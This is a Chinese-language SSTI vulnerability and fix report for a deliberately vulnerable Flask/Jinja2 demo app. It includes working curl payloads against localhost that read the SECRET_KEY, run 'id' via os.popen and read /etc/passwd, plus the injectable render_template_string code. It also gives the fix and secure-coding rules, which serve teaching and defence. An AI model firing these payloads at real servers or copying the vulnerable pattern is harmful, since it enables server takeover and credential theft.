# 🔒 SSTI（服务器端模板注入）漏洞分析与修复报告

## 目录

1. [漏洞概述](#1-漏洞概述)
2. [漏洞代码分析](#2-漏洞代码分析)
3. [漏洞利用演示](#3-漏洞利用演示)
4. [修复方案](#4-修复方案)
5. [安全编码规范](#5-安全编码规范)
6. [附录：代码对比](#6-附录代码对比)

---

## 1. 漏洞概述

### 1.1 基本信息

| 项目 | 内容 |
|------|------|
| **漏洞类型** | SSTI（Server-Side Template Injection，服务器端模板注入） |
| **危害等级** | 🔴 **严重（Critical）** |
| **影响范围** | Flask + Jinja2 Web 应用 |
| **CVE 编号** | CVE-2019-8341（同类通用型） |
| **发现时间** | 2026-07-07 |

### 1.2 漏洞描述

SSTI（Server-Side Template Injection）是指攻击者能够向服务端模板中注入恶意模板代码，并使其在服务端执行的漏洞。在 Flask/Jinja2 环境中，如果开发者使用 `render_template_string()` 并将用户输入直接拼接到模板字符串中，攻击者就可以注入 Jinja2 模板语法 `{{ }}`，进而：

- **读取应用配置**（含 SECRET_KEY、数据库密码等敏感信息）
- **访问 Python 内建对象**，遍历类继承链
- **远程命令执行（RCE）**，完全控制服务器

### 1.3 存在漏洞的文件

```
user_platform/app_vulnerable.py  ← 存在 SSTI 漏洞
user_platform/app.py             ← 已修复版本
```

---

## 2. 漏洞代码分析

### 2.1 漏洞代码（app_vulnerable.py）

```python
from flask import Flask, render_template, render_template_string, request, redirect, session
#                                   ↑  引入了危险函数

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # 用户输入 query 直接从 URL 参数获取，未经任何过滤

    template = f"""
    {{% extends "base.html" %}}
    {{% block content %}}
    <div class="card">
        <h2>搜索结果</h2>
        <p>您搜索的是: {query}</p>   ← 🚨 用户输入直接拼接进模板
    </div>
    {{% endblock %}}
    """

    return render_template_string(template)
    #      ↑  render_template_string 会将字符串作为 Jinja2 模板解析执行
```

### 2.2 漏洞原理

1. **`render_template_string()` 会执行模板语法**：该函数将传入的字符串视为 Jinja2 模板，`{{ }}`、`{% %}` 等语法标记会被解析执行。
2. **用户输入未经任何过滤**：`query` 来自 URL 参数 `?q=...`，直接通过 f-string 拼接进模板字符串。
3. **Jinja2 的强大的表达式能力**：Jinja2 模板中可以访问 Python 对象，包括 `config` 对象，以及通过 `__class__`、`__mro__`、`__subclasses__()` 等属性遍历 Python 类继承链。

### 2.3 攻击链路

```
用户输入 {{config}}
     ↓
f-string 拼接 → 模板字符串包含 {{config}}
     ↓
render_template_string() 解析执行
     ↓
Jinja2 将 {{config}} 解析为 Python 表达式
     ↓
访问 Flask 配置对象 → 泄露 SECRET_KEY
     ↓
进一步利用 → 访问 os.popen → RCE
```

---

## 3. 漏洞利用演示

### 3.1 环境准备

```bash
# 启动漏洞版本
cd user_platform
python3 app_vulnerable.py
# 服务运行在 http://0.0.0.0:5000
```

### 3.2 利用步骤

#### 步骤一：确认注入点

```bash
# 正常搜索
curl "http://127.0.0.1:5000/search?q=hello"
# 输出：您搜索的是: hello
```

#### 步骤二：探测 SSTI 存在

```bash
# 注入 Jinja2 表达式
curl "http://127.0.0.1:5000/search?q=%7B%7B7*7%7D%7D"
# 如果输出 "您搜索的是: 49"，则存在 SSTI

# 实际利用：读取 Flask 配置
curl "http://127.0.0.1:5000/search?q=%7B%7Bconfig%7D%7D"
```

**输出结果**（读取到 Flask 完整配置，含 SECRET_KEY）：

```
您搜索的是: <Config {'DEBUG': True, 'SECRET_KEY': 'dev-key-2025', ...}>
```

#### 步骤三：获取 RCE（远程命令执行）

```bash
# 通过 config.__class__.__init__.__globals__ 访问 os 模块
# URL 编码后的 payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

curl "http://127.0.0.1:5000/search?q=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27id%27).read()%7D%7D"
```

**输出结果**（成功执行 `id` 命令）：

```
您搜索的是: uid=0(root) gid=0(root) groups=0(root)
```

#### 步骤四：文件读取与目录遍历

```bash
# 读取系统文件
curl "http://127.0.0.1:5000/search?q=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27cat%20/etc/passwd%27).read()%7D%7D"

# 列出项目目录
curl "http://127.0.0.1:5000/search?q=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27ls%20-la%20.%27).read()%7D%7D"
```

### 3.3 攻击成果汇总

| 攻击类型 | Payload | 效果 |
|---------|---------|------|
| 配置泄露 | `{{config}}` | 读取 Flask 全部配置（含 SECRET_KEY） |
| 环境探测 | `{{config.__class__.__init__.__globals__}}` | 获取 Python 运行环境全局变量 |
| RCE | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | 执行任意系统命令 |
| 文件读取 | `{{...popen('cat /etc/passwd').read()}}` | 读取任意文件 |
| 目录遍历 | `{{...popen('ls -la .').read()}}` | 列出任意目录 |

---

## 4. 修复方案

### 4.1 修复方法

将 `render_template_string()` 替换为 `render_template()`，使用独立的模板文件，并将用户输入作为**上下文变量**传递给模板。Jinja2 的变量输出 `{{ var }}` 默认进行 HTML 转义，不会解析其中的模板语法。

### 4.2 修复后的代码

**app.py**（修改 `/search` 路由）：

```python
# ❌ 错误：使用 render_template_string 拼接用户输入
# from flask import render_template_string
# template = f"...{query}..."
# return render_template_string(template)

# ✅ 正确：使用 render_template + 独立模板文件
from flask import render_template

@app.route("/search")
def search():
    query = request.args.get("q", "")
    return render_template("search.html", query=query)
```

**templates/search.html**（新建安全模板）：

```html
{% extends "base.html" %}

{% block content %}
<div class="card">
    <h2>搜索结果</h2>
    <p>您搜索的是: {{ query }}</p>   <!-- ✅ Jinja2 自动转义，安全 -->
</div>
{% endblock %}
```

### 4.3 为什么这样修复有效？

| 机制 | 说明 |
|------|------|
| **模板与数据分离** | 模板文件是静态的，用户输入只作为数据传入 |
| **Jinja2 自动转义** | `{{ query }}` 中，Jinja2 会对 `query` 的值进行 HTML 转义，`<` → `&lt;`、`{{` → 原样显示 |
| **不会二次解析** | 用户输入的内容不会被再次当作模板解析，`{{config}}` 只会被当作普通文本输出 |

### 4.4 修复验证

```bash
# 1. 正常搜索仍然正常输出
$ curl "http://127.0.0.1:5000/search?q=hello"
您搜索的是: hello

# 2. SSTI 攻击被拦截（{{config}} 被当作普通文本输出）
$ curl "http://127.0.0.1:5000/search?q=%7B%7Bconfig%7D%7D"
您搜索的是: {{config}}       ← 原样输出，未执行

# 3. RCE 攻击被拦截
$ curl "http://127.0.0.1:5000/search?q=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27id%27).read()%7D%7D"
您搜索的是: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}  ← 原样输出

# 4. XSS 也被自动转义
$ curl "http://127.0.0.1:5000/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
您搜索的是: &lt;script&gt;alert(1)&lt;/script&gt;  ← HTML 实体编码
```

---

## 5. 安全编码规范

### 5.1 Jinja2 模板安全原则

| 原则 | 说明 |
|------|------|
| ✅ **永远不要拼接用户输入到模板字符串** | 使用 f-string、`+`、`%` 等将用户输入拼入模板字符串都是危险的 |
| ✅ **始终使用 `render_template()`** | 使用独立的 `.html` 模板文件，不要用 `render_template_string()` |
| ✅ **通过上下文变量传递数据** | `render_template("page.html", user_input=user_input)` |
| ✅ **在模板中用 `{{ var }}` 输出** | Jinja2 默认对 `{{ }}` 输出的内容进行 HTML 转义 |
| ❌ **避免使用 `|safe` 过滤器** | `{{ user_input|safe }}` 关闭了转义，可能导致 XSS |
| ❌ **避免使用 `autoescape false`** | `{% autoescape false %}` 关闭了整个块的自动转义 |

### 5.2 危险函数清单

| 函数 | 风险 |
|------|------|
| `render_template_string(string)` | 🔴 字符串直接作为模板解析，拼接用户输入即为 SSTI |
| `render_template_string(string, ...)` | 🟡 即使有参数，如果字符串本身拼接了用户输入，仍然危险 |
| `Template(string).render()` | 🔴 同上，直接解析字符串 |
| `render_template("file.html", var)` | 🟢 安全（前提是模板文件中不包含危险拼接） |

### 5.3 安全检查清单

- [ ] 项目中是否有 `render_template_string` 调用？
- [ ] 所有模板是否使用独立的 `.html` 文件？
- [ ] 用户输入是否通过上下文变量传递给模板？
- [ ] 用户输入在模板中是否用 `{{ var }}` 而非 `{{ var|safe }}` 输出？
- [ ] 是否存在 `{% autoescape false %}` 标记？
- [ ] 是否存在用户输入拼接 SQL、命令、XML、YAML 等解析器的情况？

---

## 6. 附录：代码对比

### 6.1 app.py 前后对比

| 行号 | 漏洞版本（app_vulnerable.py） | 修复版本（app.py） |
|------|------------------------------|-------------------|
| 1 | `from flask import ..., render_template_string, ...` | `from flask import ...`（无 `render_template_string`） |
| 65-79 | 使用 f-string 拼接 query 到模板 | 使用 `render_template("search.html", query=query)` |

### 6.2 新增文件

```
templates/search.html  ← 新增安全模板文件
```

### 6.3 项目最终结构

```
user_platform/
├── app.py                    ← ✅ 已修复（无隐患）
├── app_vulnerable.py         ← 🔴 漏洞版本（仅供演示对比）
├── templates/
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   └── search.html           ← ✅ 新增安全模板
├── static/
│   └── css/
│       └── style.css
└── docs/
    └── SECURITY_REPORT.md    ← 📄 本文档
```

---

## 总结

本次安全演练完整展示了 **SSTI（服务器端模板注入）** 漏洞从发现到修复的全过程：

1. **漏洞引入**：在 `/search` 路由中使用 `render_template_string()` 直接拼接用户输入
2. **漏洞利用**：通过 `{{config}}` 读取 Flask 配置，通过 Python 对象链最终实现 RCE
3. **漏洞修复**：改用 `render_template()` + 独立模板文件，利用 Jinja2 自动转义机制防御

该漏洞的根因是**将不可信用户输入与模板代码混合**，修复的核心原则是**保持代码与数据分离**——这是所有安全编码中最重要的原则之一。

---

*文档生成日期：2026-07-07*
*作者：Claude (Anthropic)*
